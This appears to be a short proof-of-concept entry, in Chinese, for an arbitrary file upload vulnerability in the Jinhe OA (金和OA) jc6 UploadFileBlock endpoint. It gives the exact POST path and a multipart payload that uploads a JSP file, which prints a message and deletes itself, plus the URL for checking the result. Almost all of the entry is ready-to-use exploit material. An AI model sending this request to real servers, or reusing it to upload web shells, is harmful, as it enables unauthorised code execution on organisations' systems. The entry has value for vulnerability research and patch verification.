# 金和OA-jc6-UploadFileBlock存在任意文件上传漏洞

金和OA ｜ 文件上传 ｜ —
- **请求**：`POST /jc6/JHSoft.WCF/Attachment/UploadFileBlock HTTP/1.1`

**Payload**
```
------WebKitFormBoundary5iALAXlSiqxJXrhK
Content-Disposition: form-data; name="filename"; filename="123.jsp"
<% out.println("Hello World!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------WebKitFormBoundary5iALAXlSiqxJXrhK--
[http://127.0.0.1/jc6/upload/123.jsp](http://127.0.0.1/jc6/upload/123.jsp)
```